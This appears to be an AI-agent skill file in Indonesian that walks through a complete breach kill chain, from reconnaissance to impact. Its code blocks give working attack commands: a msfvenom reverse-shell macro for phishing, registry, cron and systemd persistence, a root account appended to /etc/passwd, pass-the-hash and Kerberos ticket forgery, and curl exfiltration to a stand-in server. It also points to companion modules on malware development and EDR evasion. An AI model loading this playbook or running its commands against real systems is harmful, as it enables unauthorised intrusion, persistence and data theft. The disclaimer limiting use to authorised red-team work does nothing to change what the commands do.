---
name: breach-workflows
description: |
  Breach exploitation workflows dalam Bahasa Indonesia. Gunakan saat user mau planning full attack chain dari initial access sampai impact.
  kata kunci: breach workflow, kill chain, attack chain, initial access, persistence, privilege escalation, lateral movement, exfiltration, impact, incident response, breach simulation.
---

# Breach Exploitation Workflows — Full Attack Chain

> **Disclaimer:** Skill ini HANYA untuk authorized red team engagement, penetration testing berizin, dan tabletop exercises. Simulasi breach tanpa izin = ILEGAL.

---

## Pendahuluan

Breach workflow = full attack chain dari reconnaissance sampai impact. Ini adalah高级 level red team operations.

**Intensity guide:**
- `INTENSITY 1-3`: Planning ( threat modeling, scoping)
- `INTENSITY 4-6`: Reconnaissance (external + internal)
- `INTENSITY 7-9`: Exploitation (full chain)
- `INTENSITY 10`: Advanced (custom TTPs, evasion)

---

## Tahap 1 — Planning & Scoping

> Sebelum serangan, plan dulu.

### Engagement Rules

```markdown
## Rules of Engagement (ROE)
- **Start Date**: [date]
- **End Date**: [date]
- **Target Scope**: [IP ranges, domains]
- **Out of Scope**: [excluded targets]
- **Allowed Techniques**: [list]
- **Prohibited Techniques**: [list]
- **Emergency Contact**: [phone/email]
- **Deconfliction**: [procedure]
```

### Threat Modeling

```
┌─────────────────────────────────────────┐
│           Threat Model                  │
├─────────────────────────────────────────┤
│ 1. Identify Assets                      │
│    - Data: PII, financial, IP           │
│    - Systems: servers, workstations     │
│    - People: employees, admins          │
├─────────────────────────────────────────┤
│ 2. Identify Threats                     │
│    - External attackers                 │
│    - Malicious insiders                 │
│    - Supply chain                       │
├─────────────────────────────────────────┤
│ 3. Identify Attack Vectors              │
│    - Web applications                   │
│    - Email phishing                     │
│    - Physical access                    │
│    - Supply chain                       │
├─────────────────────────────────────────┤
│ 4. Assess Risk                          │
│    - Likelihood: High/Medium/Low        │
│    - Impact: High/Medium/Low            │
└─────────────────────────────────────────┘
```

---

## Tahap 2 — Reconnaissance

> Kumpulin data tentang target.

### External Recon

```bash
# 1. DNS enumeration
subfinder -d target.com
amass enum -passive -d target.com

# 2. Subdomain takeover check
subjack -w subdomains.txt -t 100 -timeout 30

# 3. Technology fingerprint
whatweb target.com
wappalyzer target.com

# 4. Port scan
nmap -sV -sC -p- target.com

# 5. Web content discovery
ffuf -u https://target.com/FUZZ -w wordlist.txt
gobuster dir -u https://target.com -w wordlist.txt
```

### Internal Recon

```bash
# 1. Network scan
nmap -sn 192.168.1.0/24

# 2. Service enumeration
nmap -sV -sC -p- 192.168.1.0/24

# 3. SMB enumeration
enum4linux -a 192.168.1.0/24
crackmapexec smb 192.168.1.0/24 --shares

# 4. LDAP enumeration
ldapsearch -x -H ldap://192.168.1.1 -b "DC=target,DC=com"

# 5. Active Directory enumeration
bloodhound-python -u user -p pass -d target.com -ns 192.168.1.1
```

---

## Tahap 3 — Initial Access

> Dapatkan foothold di target.

### Phishing Campaign

```bash
# 1. Create phishing document
# Macro-enabled Excel
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-c2.com LPORT=443 -f vba -o macro.vba

# 2. Send to target
# Email with attachment

# 3. Wait for execution
# Listener receives connection
```

### Web Application Exploitation

```bash
# 1. SQL injection
sqlmap -u "https://target.com/?id=1" --batch --dbs

# 2. File upload
# Upload webshell

# 3. SSRF
# Access internal services

# 4. Command injection
# Execute system commands
```

### Supply Chain Attack

```bash
# 1. Compromise software vendor
# 2. Modify software update
# 3. Distribute trojanized version
# 4. Customers install compromised software
```

---

## Tahap 4 — Persistence

> Maintain access setelah reboot.

### Windows Persistence

```powershell
# Registry run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\implant.exe" /f

# Scheduled tasks
schtasks /create /tn "Updater" /tr "C:\temp\implant.exe" /sc onlogon /f

# Services
sc create Updater binPath= "C:\temp\implant.exe" start= auto

# WMI event subscription
# (See malware-dev module)

# Startup folder
Copy-Item "C:\temp\implant.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Linux Persistence

```bash
# Cron jobs
echo "* * * * * /tmp/implant" | crontab -

# Systemd service
cat > /etc/systemd/system/updater.service << EOF
[Unit]
Description=Updater

[Service]
ExecStart=/tmp/implant
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater

# SSH keys
mkdir -p ~/.ssh
echo "public_key" >> ~/.ssh/authorized_keys
```

---

## Tahap 5 — Privilege Escalation

> Dari user biasa ke admin/root.

### Windows Privesc

```powershell
# 1. Unquoted service path
wmic service get name,displayname,pathname,startmode

# 2. DLL hijacking
# Find writable PATH directory
# Place malicious DLL

# 3. Token impersonation
# SeImpersonatePrivilege exploitation

# 4. UAC bypass
# Fodhelper, ComputerDefaults

# 5. Potato attacks
# JuicyPotato, PrintSpoofer, GodPotato
```

### Linux Privesc

```bash
# 1. SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 2. Sudo misconfig
sudo -l

# 3. Kernel exploit
# DirtyPipe, DirtyCow

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Writable /etc/passwd
echo 'root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd
```

---

## Tahap 6 — Lateral Movement

> Move dari satu host ke host lain.

### Network Pivoting

```bash
# SSH tunnel
ssh -L 8080:192.168.1.100:80 user@jumphost

# Chisel
chisel server --reverse --port 8080
chisel client attacker:8080 R:socks

# Proxychains
proxychains nmap -sT 192.168.2.0/24
```

### Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb 192.168.2.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:da769...

# Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da769... admin@192.168.2.100
```

### Kerberos Attacks

```bash
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# Golden Ticket
Rubeus.exe golden /krbtgt:hash /user:admin /domain:target.com

# Silver Ticket
Rubeus.exe silver /service:cifs/server.target.com /sid:S-1-5-21-... /ldap
```

---

## Tahap 7 — Data Exfiltration

> Curi data dari target.

### Data Collection

```bash
# Find sensitive files
find / -name "*.txt" -o -name "*.docx" -o -name "*.pdf" 2>/dev/null | head -100

# Database dump
mysqldump -u root -p --all-databases > dump.sql

# Email export
# Exchange/Office365 export

# Cloud storage
# AWS S3 sync
aws s3 sync s3://bucket-name ./loot
```

### Exfiltration Methods

```bash
# DNS exfiltration
# Encode data in DNS queries

# HTTPS exfiltration
curl -X POST https://exfil-server.com -d @data.txt

# ICMP exfiltration
# Encode data in ICMP packets

# Steganography
# Hide data in images

# Cloud storage
# Upload to Google Drive, Dropbox
```

---

## Tahap 8 — Impact

> Demonstrate business impact.

### Data Destruction

```bash
# (FOR AUTHORIZED TESTING ONLY)
# Encrypt data with ransomware
# Delete backups
# Corrupt databases
```

### Business Disruption

```bash
# Denial of service
# Shut down critical services
# Modify data integrity
# (FOR AUTHORIZED TESTING ONLY)
```

### Compliance Violations

```bash
# Access PII
# Access financial data
# Access healthcare data
# (FOR AUTHORIZED TESTING ONLY)
```

---

## Tahap 9 — Reporting

> Document everything.

### Report Structure

```markdown
# Red Team Engagement Report

## Executive Summary
- **Date**: [date]
- **Scope**: [scope]
- **Duration**: [duration]
- **Findings**: [summary]

## Attack Chain
1. [Phase 1]: [description]
2. [Phase 2]: [description]
3. [Phase 3]: [description]

## Findings
| # | Severity | Finding | Impact | Evidence |
|---|----------|---------|--------|----------|
| 1 | Critical | SQL Injection | Data breach | sqlmap dump |

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]

## Appendix
- Tools used
- Timeline
- Evidence
```

---

## Kill Chain Summary

```
1. Reconnaissance ──→ 2. Initial Access ──→ 3. Persistence
                                                      │
4. Impact ←── 6. Exfiltration ←── 5. Lateral Movement
                                                      │
                                              7. Privilege Escalation
```

---

## Tools Cheat Sheet

| Tool | Fungsi |
|------|--------|
| **BloodHound** | AD attack path analysis |
| **Rubeus** | Kerberos attacks |
| **Mimikatz** | Credential theft |
| **Impacket** | Lateral movement |
| **CrackMapExec** | Network exploitation |
| **Cobalt Strike** | C2 framework |
| **Sliver** | Open-source C2 |
| **Nmap** | Network scanning |
| **SQLMap** | SQL injection |
| **Burp Suite** | Web proxy |

---

## See Also (Module Terkait)

| Jika Task Lo... | Module Lain yang Relevan |
|-----------------|-------------------------|
| C2 infrastructure | `core/redteam-c2/SKILL.md` — Red team/C2 |
| EDR bypass | `core/edr-bypass/SKILL.md` — EDR evasion |
| Active Directory | `core/active-directory/SKILL.md` — AD attacks |
| Privilege escalation | `core/exploit-dev/windows-privesc/SKILL.md` — Windows privesc |
| Malware development | `core/malware-dev/SKILL.md` — Custom implants |
| Network recon | `core/network-recon/SKILL.md` — Recon |

---

## Resources

- **MITRE ATT&CK**: https://attack.mitre.org/
- **The Hacker Playbook**: Book
- **Red Team Development**: Book
- **PTES**: http://www.pentest-standard.org/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
